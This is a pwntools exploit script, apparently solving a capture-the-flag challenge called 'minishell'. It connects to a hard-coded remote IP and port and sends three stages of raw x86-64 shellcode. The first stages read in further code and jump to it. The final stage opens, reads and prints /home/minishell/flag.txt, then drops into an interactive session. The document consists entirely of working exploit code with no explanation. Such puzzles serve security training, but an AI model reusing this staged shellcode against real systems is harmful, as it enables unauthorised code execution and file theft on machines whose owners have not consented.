from pwn import *


context(arch="amd64",os="linux")

#r = process("./minishell")
r = remote("200.136.252.34",4545)
pause()
r.recv()
stage1 ="\x04\x0A\xB2\x0F\x0F\x05\x57\x5E\x50\x5F\x0F\x05"

log.info("Stage1")

r.send(stage1)

sleep(1)

stage2 = "\x90\xB0\x00\x66\x83\xC6\x0C\x4C\x89\xDA\x0F\x05\xFF\xE6"

log.info("Stage2")

r.sendline(stage2)

stage3 = "\x48\x83\xC6\x1E\x48\x87\xF7\xB0\x02\x0F\x05\x48\x97\x48\x96\xB0\x00\x0F\x05\xB0\x01\x48\xC7\xC7\x01\x00\x00\x00\x0F\x05/home/minishell/flag.txt\x00"

log.info("Stage3")

r.sendline(stage3)
r.interactive()
